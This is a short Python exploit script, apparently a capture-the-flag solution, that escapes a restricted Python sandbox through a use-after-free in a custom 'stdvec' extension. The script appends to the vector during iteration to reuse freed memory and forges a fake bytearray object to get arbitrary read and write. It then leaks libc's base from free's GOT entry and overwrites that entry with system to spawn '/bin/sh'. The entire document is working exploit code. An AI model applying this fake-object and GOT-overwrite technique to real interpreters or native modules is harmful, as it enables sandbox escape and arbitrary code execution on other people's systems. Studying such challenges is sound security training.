import stdvec

from sys import modules
del modules['os']
keys = list(__builtins__.__dict__.keys())
for k in keys:
    # present for you
    if k not in ['int', 'id', 'print', 'range', 'hex', 'bytearray', 'bytes']:
        del __builtins__.__dict__[k]

def p64(x):
    return x.to_bytes(8, 'little')

fake_obj = b''
fake_obj += p64(1)              # ob_refcnt
fake_obj += p64(id(bytearray))  # ob_type
fake_obj += p64(0x1000000)      # ob_size
fake_obj += p64(0)              # ob_alloc
fake_obj += p64(0)              # ob_bytes
fake_obj += p64(0)              # ob_start

l = stdvec.StdVec()
for i in range(0x100):
    l.append(0)

i = 0
for x in l:
    if i == 0:
        l.append(0)
        _ = bytearray(b'A' * 8 + p64(id(fake_obj) + 0x20) + b'A' * 0x7f0)
    elif i == 1:
        break
    i += 1

def leak(arr, offset):
    val = 0
    for i in range(8):
        val += arr[offset + i] << i * 8
    return val

def overwrite(arr, offset, value):
    bs = p64(value)
    for i in range(8):
        arr[offset + i] = bs[i]

free_got = 0xa00520
free_offset = 0x979c0
system_offset = 0x4f4e0

libc_base = leak(x, free_got) - free_offset
overwrite(x, free_got, libc_base + system_offset)

print('/bin/sh')
